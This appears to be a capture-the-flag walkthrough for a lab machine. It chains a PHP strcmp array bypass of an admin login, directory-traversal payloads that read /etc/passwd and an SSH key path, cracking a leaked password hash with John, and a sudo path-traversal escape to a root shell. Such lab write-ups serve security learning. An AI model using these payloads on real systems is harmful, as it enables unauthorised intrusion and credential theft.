deep nmap shows ports 22, 80, 2112 ftp
gobuster on port 80 reveals an admin login page

anonymous ftp login on port 2112 reveals an intex.php.bak
```php
<?php
$pass= "potato"; //note Change this password regularly
if($_GET['login']==="1"){
  if (strcmp($_POST['username'], "admin") == 0  && strcmp($_POST['password'], $pass) == 0) {
    echo "Welcome! </br> Go to the <a href=\"dashboard.php\">dashboard</a>";
    setcookie('pass', $pass, time() + 365*24*3600);
  }else{
    echo "<p>Bad login/password! </br> Return to the <a href=\"index.php\">login page</a> <p>";
  }
  exit();
}
?>
```
From a walkthrough, we come across https://www.doyler.net/security-not-included/bypassing-php-strcmp-abctf2016 where it says, "If I set `$_GET['password']` equal to an empty array, the strcmp would return a NULL. Due to some ingerent weakness in PHP's comparisions, `NULL == 0` will return true

So, we just need to capture the login req in burp, and make `password=something` to `password[]==""`

With this, we log into admin area
There a few tabs, here. The "logs" tab display selected log
looking at POST request, we can see it uses `file=log3.txt`
We can modify it to leverage dir traversal and file disclosure
`file=..\..\..\..\..\..\etc\passwd`
--> reveals webmin user
but `file=..\..\..\..\..\home\webadmin\.ssh\id_rsa` doesnt give us anything

The walkthrough shows we can crack the hash in the /etc/passwd line
`webadmin:$1$webadmin$3sXBxGUtDGIFAcnNTNhi6/:1001:1001:webadmin,,,:/home/webadmin:/bin/bash`
John quickly gives the password "dragon"
`ssh webmin@IP` dragon

```zsh
sudo -l
#(ALL : ALL) /bin/nice /notes/*

#gtfo bin shows how we can get root by running `nice /bin/sh`
#so again, we use dir traversal
sudo /bin/nice /notes/../../bin/sh
root!
```